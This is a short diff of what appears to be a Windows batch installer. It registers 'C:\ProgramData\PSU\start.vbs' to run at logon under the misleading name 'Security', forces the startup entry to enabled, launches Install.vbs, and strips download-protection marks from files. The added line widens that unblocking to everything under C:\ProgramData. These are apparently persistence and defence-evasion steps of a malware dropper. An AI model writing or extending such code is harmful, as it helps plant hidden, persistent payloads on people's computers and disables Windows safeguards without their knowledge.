@@ -26,6 +26,7 @@ echo timeout 0
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 powershell.exe Unblock-File -Path "*"
+powershell.exe Unblock-File -Path "C:\ProgramData\*"
 powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*"
 start "" "C:\ProgramData\PSU\Install.vbs"
 timeout 1 >> nul
